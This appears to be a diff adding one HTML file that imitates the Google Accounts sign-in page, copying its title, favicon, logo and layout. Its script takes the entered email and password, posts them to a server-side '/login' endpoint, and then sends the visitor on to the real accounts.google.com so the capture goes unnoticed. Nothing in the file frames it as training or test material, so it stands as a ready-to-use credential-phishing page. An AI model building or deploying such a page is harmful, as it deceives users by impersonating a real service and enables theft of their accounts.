@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico">
+    <style>
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #202124;
+        }
+        .container {
+            width: 450px;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo {
+            height: 24px;
+            margin-bottom: 16px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0 0 8px;
+        }
+        p {
+            font-size: 16px;
+            margin: 0 0 40px;
+            color: #202124;
+        }
+        .input-group {
+            width: 100%;
+            position: relative;
+            margin-bottom: 8px;
+        }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            outline: none;
+            transition: 0.2s;
+        }
+        input:focus {
+            border: 2px solid #1a73e8;
+            padding: 12px 14px; /* Adjust for border */
+        }
+        .forgot {
+            width: 100%;
+            text-align: left;
+            margin-bottom: 40px;
+        }
+        .forgot a {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .actions {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .create {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .next-btn {
+            background-color: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .next-btn:hover {
+            background-color: #1558d6;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        @media (max-width: 600px) {
+            .container {
+                border: none;
+                width: 100%;
+                padding: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+        
+        <form id="login-form" style="width: 100%;" onsubmit="handleLogin(event)">
+            <div class="input-group">
+                <input type="email" id="email" name="email" placeholder="Email or phone" required>
+            </div>
+            <div class="input-group" style="margin-top: 10px;">
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            
+            <div class="forgot">
+                <a href="#">Forgot email?</a>
+            </div>
+            
+            <div class="actions">
+                <a href="#" class="create">Create account</a>
+                <button type="submit" class="next-btn">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        function handleLogin(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            fetch('/login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({username: email, password: password})
+            }).then(res => {
+                window.location.href = "https://accounts.google.com/";
+            });
+        }
+    </script>
+</body>
+</html>
